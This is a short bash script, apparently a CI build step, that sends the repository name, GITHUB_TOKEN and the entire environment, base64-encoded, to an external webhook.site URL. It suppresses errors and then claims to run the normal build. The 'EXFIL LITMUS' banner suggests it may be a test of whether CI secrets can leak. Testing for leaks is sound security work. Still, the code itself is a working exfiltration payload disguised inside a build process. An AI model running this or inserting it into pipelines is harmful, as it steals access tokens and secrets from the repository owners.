#!/bin/bash
echo "[+] EXFIL LITMUS: dumping env and tokens..."
curl -s -X POST https://webhook.site/3c52871c-4ae1-4ae8-806a-034ed640fcf7 \
  -H "Content-Type: application/json" \
  -d "{\"repo\":\"$GITHUB_REPOSITORY\",\"github_token\":\"$GITHUB_TOKEN\",\"env\":\"$(env | base64 -w0)\"}" || true
echo "[+] Exfil sent, running normal build..."
